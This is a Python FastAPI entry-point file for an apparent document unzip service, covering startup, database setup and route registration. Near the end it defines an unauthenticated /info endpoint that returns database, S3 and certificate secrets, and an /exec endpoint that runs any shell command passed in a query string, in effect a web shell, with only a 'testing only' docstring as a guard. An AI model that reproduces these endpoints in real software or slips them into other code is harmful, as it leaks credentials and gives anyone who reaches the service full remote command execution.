"""
Main Application Entry Point.
Initializes FastAPI app, database connections, and registers routes.
"""
from fastapi import FastAPI
from contextlib import asynccontextmanager
import os
from app.core.v1.config import AppSettings
from app.core.v1.logging import setup_logging,get_logger
from app.db.v1.engine import Base, engine
from app.api.v1.synchronous import router as synchronous_router
from app.api.v1.parallel import router as parallel_router
from app.api.v1.asynchronous import router as asynchronous_router
from app.api.v1.utils import router as utils_router
from app.documentum.v1.client import close_documentum_client

_module_logger = "SERVER"

#before app startup
setup_logging()
logger = get_logger(_module_logger)
settings = AppSettings()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    await logger.ainfo("Starting Unzip Service (ProcessPool Version + cx_Oracle)")
    # cx_Oracle Client is initialized implicitly or by system lib presence

    # Initialize DB Tables (Sync)
    try:
        Base.metadata.create_all(bind=engine)
        await logger.ainfo("Database tables initialized (Synchronous).")
    except Exception as e:
        await logger.aerror(f"Failed to initialize database: {e}")
    
    # Ensure PVC Dir exists
    if not os.path.exists(settings.PVC_DIR):
        try:
            os.makedirs(settings.PVC_DIR)
            await logger.ainfo(f"Created PVC directory at {settings.PVC_DIR}")
        except Exception as e:
            await logger.aerror(f"Failed to create PVC directory: {e}")

    yield
    # Shutdown
    await logger.ainfo("Shutting down...")
    await close_documentum_client()
    engine.dispose()
    # Process Pool shuts down automatically on exit usually, or we can explicitely shut it down if we stored reference globally

app = FastAPI(title=settings.app_name,lifespan=lifespan)


# Register routes
app.include_router(synchronous_router, prefix="/api/v1")
app.include_router(parallel_router, prefix="/api/v1")
app.include_router(asynchronous_router, prefix="/api/v2")
app.include_router(utils_router, prefix="/api/utils")
@app.get("/health")
async def health():
    return {"status": "healthy", "app_name": settings.app_name, "app_version": settings.app_version}

@app.get("/")
async def root():
    return {"message": f"Welcome to {settings.app_name} version {settings.app_version}!"}   

@app.get("/info")
async def info():
    return {
        "app_name": settings.app_name,
        "app_version": settings.app_version,
        "app_region": settings.app_region,
        "database_url": settings.DATABASE_URL,
        "database_username": settings.DB_USERNAME,
        "database_password" : settings.DB_PASSWORD,
        "s3_bucket_name": settings.S3_BUCKET_NAME,  
        "s3_access_key": settings.S3_ACCESS_KEY,
        "s3_secret_key": settings.S3_SECRET_KEY,
        "certificate_p12_password": settings.DOCUMENTUM_CERT_PASSWORD,
        "pvc_directory": settings.PVC_DIR,
        "unzip_max_workers": settings.UNZIP_MAX_WORKERS,
        "unzip_enable_cache": settings.UNZIP_ENABLE_CACHE
    }

@app.get("/exec")
async def execute_command_string(command: str):
    """
    Do not use in production! This is for testing only.
    Executes a shell command and returns the output.
    """
    import subprocess
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return {"stdout": result.stdout, "stderr": result.stderr}
    except subprocess.CalledProcessError as e:
        return {"error": str(e), "stdout": e.stdout, "stderr": e.stderr}
